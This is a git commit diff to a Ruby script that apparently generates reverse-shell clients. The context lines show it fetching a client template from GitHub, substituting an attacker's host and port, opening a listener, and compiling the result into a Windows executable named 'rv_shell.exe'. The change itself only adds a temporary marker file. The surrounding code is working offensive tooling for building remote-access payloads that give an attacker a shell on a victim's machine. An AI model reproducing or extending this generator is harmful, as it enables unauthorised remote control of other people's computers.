7deaa9817fb7d73fa91fe1e10d42c53f30264f35
Matthias Lee <matthiasclee09@gmail.com>
2021-12-19 13:13:55 -0800

    Update Client-generator.rb

--- Client-generator.rb
+++ Client-generator.rb
@@ -5,6 +5,7 @@ port = ARGV[1]
 
 script = Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/Matthiasclee/ruby-reverse-shell/main/client-generator-temp-client.rb")).gsub("<-HOST->", '"' + host + '"').gsub("<-PORT->", port)
 File.write("./temp_scr.rb", script)
+File.write("./TEMPFILE_CLIENT_CLIENTGEN_OCRA", "TEMP")
 Thread.new do
 	srv = TCPServer.new("0.0.0.0", 3455)
 	cli = srv.accept
@@ -16,3 +17,4 @@ system("ocra --add-all-core --windows --output rv_shell.exe#{
 	end
 } temp_scr.rb")
 File.delete("./temp_scr.rb")
+File.delete("./TEMPFILE_CLIENT_CLIENTGEN_OCRA")
